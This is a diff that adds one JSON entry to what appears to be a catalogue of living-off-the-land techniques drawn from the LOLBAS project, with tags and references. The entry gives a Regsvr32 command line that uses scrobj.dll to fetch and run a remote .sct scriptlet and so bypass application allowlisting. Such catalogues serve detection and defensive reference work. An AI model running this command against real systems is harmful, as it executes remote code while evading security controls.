@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-regsvr32-exe-awl-bypass-1",
+  "name": "LOLBAS · Regsvr32.exe (AWL Bypass) #1",
+  "command": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll",
+  "description": "Execute the specified remote .SCT script with scrobj.dll.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "regsvr32",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Regsvr32/",
+  "upstream_id": "Regsvr32.exe/AWL Bypass/0",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Regsvr32.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Regsvr32/"
+    }
+  ]
+}
